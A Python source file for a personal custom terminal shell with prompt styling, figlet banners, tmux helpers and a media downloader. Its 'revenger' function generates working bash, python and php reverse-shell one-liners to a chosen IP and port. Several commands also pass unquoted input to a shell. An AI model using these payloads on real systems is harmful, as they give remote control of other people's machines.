import os
import sys
import pyfiglet
import socket
import subprocess
import readline
import random
import time
import datetime
import platform
import distro
import youtube_dl

# color variables
red = '\033[0;31m'
boldRED = '\033[1;31m'
yellow = '\033[1;33m'
green = '\033[0;32m'
blue = '\033[0;34m'
purple = '\033[0;35m'
lightGRN = '\033[1;32m'
lightBLUE = '\033[1;34m'
nc = '\033[0m'

def getPrompt():
    user = os.getlogin()
    hostname = socket.gethostname()
    cwd = os.getcwd().replace(os.environ["HOME"], "~")
    time_now = time.strftime("%H:%M:%S")
    prompt = f"{purple};-)[{nc}{lightBLUE}{user}@{hostname}{nc}{purple}]{nc} {lightGRN}in{nc} {yellow}{cwd}{nc} {green}{time_now}{nc}\n"
    prompt += f"{lightBLUE}❯{nc} "
    return prompt

def printFiglet(text):
    figletOutput = subprocess.check_output(f"figlet -f small.flf '{text}'", shell=True).decode()
    print(figletOutput, end="")

def runCommand(cmd):
    args = cmd.split()
    if args[0] == 'helloFriend':
        hello_friend()
    elif args[0] == 'bye':
        bye()
    elif args[0] == 'time':
        show_time()
    elif args[0] == 'date':
        show_date()
    elif args[0] == 'day':
        show_day()
    elif args[0] == 'whichDistro':
        which_distro()
    elif args[0] == 'revenger':
        revenger()
    elif args[0] == 'grabip':
        grabip()
    elif args[0] == 'tmux':
        new_session()
    elif args[0] == 'splitV':
        split_v()
    elif args[0] == 'splitH':
        split_h()
    elif args[0] == 'defaultTheme':
        defaulttheme()
    elif args[0] == 'downloadIt':
        url = input("enter the url : ")
        download_video(url)
    elif args[0] == 'cd':
        try:
            if len(args) > 1:
                os.chdir(os.path.expanduser(args[1]))
            else:
                os.chdir(os.path.expanduser("~"))
        except IndexError:
            print(f"{red}cd: missing operand{nc}")
        except FileNotFoundError:
            print(f"{red}cd: no such file or directory: {args[1]}{nc}")
    else:
        try:
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as ex:
            print(f"{red}Command '{cmd}' failed with exit code {ex.returncode}.{nc}")


def hello_friend():
    print("enter the path of file : ")
    path = input()
    if os.path.exists(f'{path}'):
        print("please wait connecting with vpn...")
        os.system(f'sudo openvpn {path}')
    else:
        print("Hey! the file you're trying to use doesn't exist.")


def download_video(url):
    ydl_opts = {
        'format': 'bestaudio/best',
        'outtmpl': '%(id)s.%(ext)s',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '320',
        }],
    }
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        ydl.download([url])


def defaulttheme():
    os.system('tmux send-keys -t 0 "tmux split-window -h \' -l 90\';tmux select-pane -t 1" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 0; tmux split-window -v \'-l 34\';tmux select-pane -t 2" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 1; tmux split-window -v \'-l 25\';tmux select-pane -t 3" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 10\';tmux select-pane -t 4" Enter')
    os.system('tmux send-keys -t 0 "tmux select-pane -t 3; tmux split-window -v \'-l 8\';tmux select-pane -t 5" Enter')
    time.sleep(1)
    os.system('tmux send-keys -t 4 "tmux select-pane -t 4; ./asset1;"')
    os.system('tmux send-keys -t 4 "" Enter')
    os.system('clear')


def revenger():
    ip_address = input("Enter target IP address: ")
    shell_type = input("Enter shell type (bash/python/python3/php): ")
    
    rev_shells = {
        'bash': f'bash -c "/bin/bash -i >& /dev/tcp/{ip_address}/4444 0>&1"',
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'php': f"php -r '\$sock=fsockopen(\"{ip_address}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
    }
    
    rev_shell = rev_shells.get(shell_type)
    if rev_shell is None:
        print("Invalid shell type. Valid options are bash, python, or php.")
        return
    
    subprocess.run(['echo', rev_shell], capture_output=True, text=True, check=True)
    subprocess.run(['xclip', '-selection', 'clipboard'], input=rev_shell, text=True, check=True)
    print("\033[1;32mReverse shell generated and copied to clipboard!\033[0m")


def grabip():
    ips = os.popen('ifconfig | grep -E "inet [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | awk \'{print $1,$2}\'').read().strip()
    if ips:
        os.system(f'echo "{ips}" | figlet -f small.flf')
    else:
        print('No IP addresses found.')


def split_v():
    subprocess.run(['tmux', 'split-window', '-v', '-c', './', 'python3', 'spyshell.py'])


def split_h():
    subprocess.run(['tmux', 'split-window', '-h', '-c', './', 'python3', 'spyshell.py'])


def new_session():
    print(f"enter the session name:")
    sess_name = input()
    subprocess.run(['tmux', 'new-session', '-n', 'YourSessionName', 'python3', 'spyshell.py'])
    subprocess.run(['tmux', 'set', '-g', 'mouse', 'on'])


def show_time():
    now = datetime.datetime.now()
    time_str = now.strftime("%H : %M : %S")
    print(f"{boldRED}" + pyfiglet.figlet_format(time_str, font='small') + f"{nc}")


def show_date():
    now = datetime.datetime.now()
    date_str = now.strftime(f"%d / %m / %Y")
    figlet_str = pyfiglet.figlet_format(date_str, font='small')
    print(f"{boldRED}" + figlet_str + f"{nc}")


def which_distro():
    dist_name = distro.name(pretty=True)
    dist_version = distro.version(pretty=True)
    print(f"{blue}{platform.system()} {dist_name} {dist_version} {platform.machine()}{nc}")


def show_day():
    days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
    now = datetime.datetime.now()
    day_name = days[now.weekday()]
    print(f"{boldRED}" + pyfiglet.figlet_format(day_name, font='small') + f"{nc}")


def bye():
    var1 = f"Goodbye {os.getlogin()}"
    print(f"{boldRED}" + pyfiglet.figlet_format(var1, font='small') + f"{nc}")
    sys.exit()

historyFile = os.path.expanduser("~/.spyrc")

while 1:
    cmd = input(getPrompt())
    if cmd.strip():
        with open(historyFile, "a") as f:
            f.write(cmd + "\n")
        try:
            runCommand(cmd)
        except KeyboardInterrupt:
            print(f"{yellow}Command interrupted by {os.getlogin()}.{nc}")
            continue
